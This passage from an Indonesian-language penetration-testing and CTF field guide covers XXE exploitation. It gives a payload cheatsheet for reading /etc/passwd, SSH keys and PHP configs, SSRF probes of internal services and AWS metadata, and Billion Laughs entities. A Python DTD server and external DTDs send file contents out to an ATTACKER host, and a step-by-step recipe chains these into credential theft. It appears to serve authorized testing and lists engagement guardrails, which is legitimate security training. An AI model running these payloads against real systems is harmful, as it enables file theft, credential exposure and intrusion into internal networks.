> Bytes yang dikirim harus benar-benar UTF-16 — ganti declaration saja tidak cukup.

**CDATA — bukan teknik XXE:**

CDATA berguna untuk menampilkan output yang mengandung karakter XML, bukan sebagai teknik bypass:

```xml
<![CDATA[text with <, >, & characters]]>
```

Jika butuh CDATA dengan entity output, gunakan DTD trick khusus (hanya bekerja pada parser tertentu) — bukan path utama.

---

### Chaining Overview

```text
XXE + File Read → Credential Exposure
    file:///var/www/html/config.php → DB credentials → pivot ke DB

XXE + SSRF → Internal Admin Access
    http://internal-service/ → pivot ke target baru

XXE + SSH Key
    file:///home/user/.ssh/id_rsa → direct SSH access

XXE + AWS Metadata (IMDSv1 — if enabled, jika instance memiliki IAM role ter-attach)
    http://169.254.169.254/latest/meta-data/iam/security-credentials/ → role name
    → credentials (access key + secret + token) jika role ter-attach ada
    [IMDSv2 membutuhkan PUT + token header — tidak via XXE GET]
    [GCP/Azure membutuhkan custom header — tidak via bare XXE GET]
```

---

### Billion Laughs (DoS Context)

```xml
<!ENTITY a "A">
<!ENTITY b "&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;">
<!ENTITY d "&c;&c;&c;&c;">
<!-- setiap level berlipat 4x → exponential memory expansion -->
```

> **Defensive indicator:** Jika parser **tidak crash** saat kamu submit entity expansion → ada mitigasi expansion limit. Itu adalah **temuan positif** (parser dilindungi). Catat sebagai finding, bukan failure.

---

## 🧰 Tools & Scripts

### Burp Suite — Key Tabs & Shortcuts

|Tab|Fungsi di XXE|
|---|---|
|Proxy → HTTP History|Temukan semua XML requests|
|Proxy → Intercept|Tangkap request sebelum dikirim|
|Repeater|Modifikasi dan kirim ulang payload|
|Intruder|Port sweep via SSRF, fuzzing entity values|
|Collaborator|OOB callback untuk Blind XXE (Pro only)|
|Decoder|Encode/decode URL, base64|

**Key Repeater Tips:**

```text
- Ctrl+U → URL-encode selection
- Inspector panel → parse request/response lebih mudah
- "Follow redirects" → aktifkan jika response redirect
- Content-Length otomatis di-update saat kamu Send
- Ctrl+S → save request ke history
```

---

### OOB Listener Quick Setup

**Python HTTP Server (simple):**

```bash
mkdir -p ~/xxe_loot/dtd
cd ~/xxe_loot/dtd
python3 -m http.server 8000
# Log tampil di terminal: IP, path, timestamp
```

**Interactsh (external callback, gratis):**

```bash
# Install
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
export PATH=$PATH:$(go env GOPATH)/bin

# Run
interactsh-client
# Output: c1234567890abcdef.oast.fun
```

Gunakan domain di payload Burp Repeater. Callback langsung muncul di terminal.

---

### xxe_dtd_server.py

Script Python untuk serve DTD dan log callbacks secara terstruktur:

```python
#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import argparse
import ipaddress
import sys


DTD_TEMPLATE = """<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://{host}:{port}/?d=%file;'>">
%eval;
%send;
"""


class DTDHandler(BaseHTTPRequestHandler):

    server_version = "XXE-Lab-Server/1.0"

    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)

        timestamp = datetime.now(timezone.utc).isoformat()
        client_ip = self.client_address[0]

        print("\n" + "=" * 60)
        print("XXE CALLBACK")
        print("=" * 60)
        print(f"Timestamp : {timestamp}")
        print(f"Client IP : {client_ip}")
        print(f"Path      : {parsed.path}")

        data = params.get("data", []) or params.get("d", [])
        if data:
            print(f"Data      : {data[0]}")
        else:
            print("Data      : <none>")

        if parsed.path == "/xxe.dtd":
            dtd = DTD_TEMPLATE.format(
                host=self.server.callback_host,
                port=self.server.callback_port
            )
            body = dtd.encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/xml-dtd")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Cache-Control", "no-store")
            self.end_headers()
            self.wfile.write(body)
            return

        body = b"OK\n"
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, fmt, *args):
        return


def main():
    parser = argparse.ArgumentParser(
        description="Simple XXE DTD/callback server for authorized labs."
    )
    parser.add_argument("-p", "--port", type=int, default=8000)
    parser.add_argument("--bind", default="0.0.0.0")
    parser.add_argument("--callback-host", required=True)
    parser.add_argument("--callback-port", type=int, required=True)
    args = parser.parse_args()

    server = HTTPServer((args.bind, args.port), DTDHandler)
    server.callback_host = args.callback_host
    server.callback_port = args.callback_port

    print(f"[*] Listening on {args.bind}:{args.port}")
    print(f"[*] DTD URL: http://{args.callback_host}:{args.callback_port}/xxe.dtd")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Stopping server...")
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
```

**Jalankan:**

```bash
python3 xxe_dtd_server.py \
  --port 8000 \
  --callback-host ATTACKER_IP \
  --callback-port 8000
```

**Expected output:**

```text
[*] Listening on 0.0.0.0:8000
[*] DTD URL: http://ATTACKER:8000/xxe.dtd
```

Port sudah dipakai? → `kill $(lsof -ti:8000)` lalu restart.

---

### xxeinjector

Automated XXE testing tool. Berguna setelah XXE dikonfirmasi untuk sweep file.

```bash
# Simpan request dari Burp: klik kanan request → Save item
# Jalankan terhadap request file tersebut
xxeinjector --help
```

> Cek `--help` selalu — syntax berbeda antar versi.

---

## 🏃 Quick CTF Recipe

Ditemukan endpoint XML? Gunakan urutan ini:

**Setup (jalankan sekali):**

```bash
export TARGET="http://10.10.11.200"
mkdir -p ~/xxe_loot/dtd && cd ~/xxe_loot/dtd
```

**Step 1 — Baseline** (di Burp Repeater):

```xml
<?xml version="1.0"?>
<root><value>BASELINE_TEST</value></root>
```

→ `BASELINE_TEST` muncul di response? Parser menerima XML.

**Step 2 — Internal Entity:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test "XXE_123">]>
<root><value>&test;</value></root>
```

→ `XXE_123` muncul? Entity processing aktif.

**Step 3 — File Read:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root><value>&xxe;</value></root>
```

→ Hostname muncul? **XXE confirmed!** Lanjut baca `/etc/passwd`, config files.

**Step 4 — Blind XXE (jika output tidak terlihat):**

Pilih path sesuai kondisi environment:

- OOB HTTP available → Path A (External DTD via OOB) di bawah
- No outbound, error visible → TREE 7 (Local DTD Repurpose) terlebih dahulu; jika tidak ada local DTD & parser verified libxml2/PHP → TREE 4 LANGKAH C [parser-specific]
- No outbound, no error → tidak ada observable channel → reassess attack surface

**Path A: External DTD via OOB (jika outbound HTTP tersedia):**

```bash
# Terminal 1
cat > ~/xxe_loot/dtd/xxe.dtd << 'EOF'
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%send;
EOF
python3 -m http.server 8000
```

Payload di Repeater:

```xml
<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "http://ATTACKER:8000/xxe.dtd">
<root><value>test</value></root>
```

→ Callback masuk di terminal? Data di-exfil via OOB.

**Step 5 — SSRF (probe internal):**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root><value>&xxe;</value></root>
```

→ HTML/JSON internal muncul? Internal service ditemukan.

---

## ⚡ Quick Reference — Payload Cheatsheet

```xml
<!-- Basic File Read -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>

<!-- SSRF ke internal -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/">
]>
<root><data>&xxe;</data></root>

<!-- OOB Connectivity Test -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "http://ATTACKER:8000/test">
]>
<root><data>&xxe;</data></root>

<!-- Blind XXE via External DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://ATTACKER:8000/xxe.dtd">
<root><data>test</data></root>

<!-- Error-Based (no outbound) — [Parser-specific: libxml2/PHP; &#x25; nesting dalam Internal DTD adalah ekstensi non-spec. Java Xerces/.NET kemungkinan menolak. Jika gagal → gunakan External DTD atau Local DTD Repurpose] -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
]>
<root><data>test</data></root>

<!-- XInclude (DOCTYPE blocked) -->
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
</root>

<!-- PHP Wrapper (base64) — [PHP-specific: requires PHP stream wrapper] -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<root><data>&xxe;</data></root>

<!-- Repurposing Local DTD — [Environment-dependent: path & entity name bergantung distro, OS version, dan installed packages. 'ISOamso' adalah contoh dari docbookx.dtd; DTD lain menggunakan entity name berbeda. Verifikasi path dan entity yang tersedia sebelum exploit — lihat Fase 6] -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE message [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
    <!ENTITY % ISOamso '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
    '>
    %local_dtd;
]>
<root><data>test</data></root>
```

**External DTD content (xxe.dtd di server attacker):**

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://ATTACKER:8000/?d=%file;'>">
%eval;
%send;
```

---

## 🛠️ Troubleshooting

|Evidence|Possible Cause|Diagnosis & Action|
|---|---|---|
|`DOCTYPE is disallowed`|Parser menolak DTD|Coba XInclude (Fase 1.4). Jika blocked juga → file upload path|
|Entity literal muncul (`&test;`)|Entity processing disabled|Bedakan dulu: cek apakah DOCTYPE diproses sama sekali|
|`Permission denied` membaca file|Process tidak punya permission|Coba `/etc/hostname`, `/etc/hosts`, `/proc/version` dulu|
|File muncul tapi XML rusak/kosong|File mengandung `<`, `>`, `&`|Gunakan `php://filter/convert.base64-encode` [PHP-specific]; di non-PHP server coba OOB via External DTD|
|DTD request masuk, tidak ada data callback|Parameter entity nesting restricted di parser ini|Pastikan nesting via External DTD, bukan Internal DTD|
|OOB callback tidak sampai (HTTP)|Egress firewall|Coba DNS callback via Burp Collaborator atau interactsh|
|OOB DNS juga tidak sampai|Strict egress filtering|Coba Local DTD repurpose (Fase 6) terlebih dahulu [parser-agnostic]; jika local DTD tidak tersedia dan parser verified libxml2/PHP → Error-Based (3.4) [parser-specific]|
|SVG upload ditolak|Extension/MIME validation|Coba ubah `Content-Type: image/svg+xml` di Burp Repeater|
|SVG diterima tapi tidak trigger XXE|Server tidak proses XML server-side (hanya kirim ke browser)|Cari server-side conversion endpoint (thumbnail generator, preview API)|
|DOCX tidak trigger XXE|Library Office modern sudah disable external entities|Cek versi library — tidak bisa di-bypass jika hardened|
|ZIP corruption setelah edit DOCX|Archive structure rusak saat repack|Pastikan `zip -r` dari dalam directory, bukan dari parent|
|Error-based tidak menampilkan data|Parser tidak verbose di error|Parser mungkin strip error detail — coba OOB approach|
|Local DTD path tidak ada|Server pakai distro berbeda|Enumerate path lain di common paths list (Fase 6.1)|
|`ISOamso` entity tidak ada|Versi DTD berbeda|Baca isi DTD yang ditemukan untuk cari entity yang bisa di-override|
|AWS metadata 401/timeout|IMDSv2 aktif; atau GCP/Azure (custom header required)|AWS IMDSv2: butuh PUT + token — tidak via XXE GET. GCP: butuh Metadata-Flavor: Google header. Azure: butuh Metadata: true header. Document sebagai limitation di report.|
|Port sweep tidak memberi hasil jelas|SSRF detection via XXE bersifat indirect dan parser-dependent|Perhatikan kombinasi: length, status, timing, content — jangan rely pada satu indikator saja|
|base64 output rusak|Response JSON-encoding whitespace|Copy raw response dari Burp Response tab, strip whitespace sebelum decode|
|Python server port sudah dipakai|Konflik port|`kill $(lsof -ti:8000)` lalu restart|
|`SOAP returns 415`|Content-Type salah|Ganti `text/xml` ↔ `application/soap+xml`|
|Billion Laughs tidak crash parser|Expansion limit aktif|Itu mitigasi — catat sebagai temuan positif|
|SAML tidak vulnerable ke XXE|Signature/validation error berbeda dari XXE|Pisahkan analysis SAML auth logic dari XML entity processing|
|XInclude tidak bekerja|XInclude disabled di parser|Tidak ada bypass langsung — cari attack surface lain|
|Parameter entity error|`%name;` dipanggil di luar DTD context|Parameter entity hanya valid di DTD, bukan di XML document body|

---

## ✅ Final Checklist

```text
[ ] Endpoint menerima XML teridentifikasi (Burp HTTP History)
[ ] Normal XML request berhasil — baseline confirmed (Fase 1.1)
[ ] Internal entity di-resolve — DOCTYPE processing aktif (Fase 1.2)
[ ] External entity file:/// bekerja — XXE confirmed (Fase 1.3)
[ ] File sensitif dibaca: hostname → passwd → config/keys (Fase 2.1)
[ ] PHP wrapper dicoba jika file mengandung karakter XML spesial (Fase 2.2)
[ ] Error channel diperiksa — ada pesan parser di 4xx/5xx?
[ ] OOB connectivity dikonfirmasi via HTTP (Fase 3.2)
[ ] External DTD di-setup dan di-test (python3 -m http.server)
[ ] Blind XXE data exfil dicoba jika direct output tidak ada (Fase 3.3)
[ ] Local DTD repurposing dicoba jika no outbound + error visible (Fase 6) [prioritas sebelum Error-Based]
[ ] Error-based dicoba jika no outbound + error visible + tidak ada local DTD + parser verified libxml2/PHP (Fase 3.4) [parser-specific — bukan langkah wajib universal]
[ ] SSRF probe internal services (Fase 4.1 + Burp Intruder port sweep)
[ ] Cloud metadata dicek jika target di cloud (Fase 4.2)
[ ] XInclude dicoba jika DOCTYPE diblok (Fase 1.4)
[ ] SVG upload dicoba jika ada file upload (Fase 5A)
[ ] DOCX/XLSX dicoba jika ada document upload (Fase 5B)
[ ] SOAP endpoint dikonfirmasi (SOAPAction header ada?)
[ ] SAML flow dibedakan dari OIDC/OAuth
[ ] Evidence di Burp Repeater disimpan (klik kanan → Save item)
[ ] PoC reproducible dan terdokumentasi
```

---

## ⚠️ Authorized Testing Guardrails

Verifikasi checklist ini sebelum testing dan saat mendokumentasikan findings:

```text
□ Scope verified — target dalam scope engagement yang disepakati
□ OOB callback destination authorized (IP/domain listener dalam scope)
□ Internal network probing diizinkan dalam rules of engagement
□ Hindari entity expansion destruktif (Billion Laughs) kecuali secara eksplisit disetujui
□ Hindari retrieval file sensitif yang tidak perlu untuk membuktikan PoC
□ Cloud metadata testing secara eksplisit diizinkan (termasuk IMDSv1 access)
□ Define evidence requirements sebelum testing — kapan XXE dianggap "confirmed"
□ Define stop conditions sebelum eskalasi lebih jauh
□ Document asumsi parser/version di report findings
□ Simpan evidence di Burp Repeater history (klik kanan → Save item)
```

---

## → Cross-Workflow Links

Setelah XXE berhasil dan mendapat artifact:

|Artifact Ditemukan|Next Workflow|
|---|---|
|DB credentials dari config file|[14a. MySQL & MariaDB Exploitation Workflow — Master Field Guide](/docs/mysql) / [Pentest Workflow: Microsoft SQL Server (MSSQL) Exploitation](/docs/mssql)|
|SSH private key|[06. SSH Exploitation & Tunneling Workflow — Master Field Guide](/docs/ssh)|
|SSRF ke internal service|[🌐 22 — SSRF Workflow](/docs/ssrf)|
|AWS IAM credentials|[🚀 Bagian 0: Konteks & Lab Setup](/docs/aws-pentest)|
|User list + shells dari /etc/passwd|[07. FTP & FTPS Exploitation Workflow — Master Field Guide](/docs/ftp)|

---

_[File 22: SSRF →](/docs/ssrf)_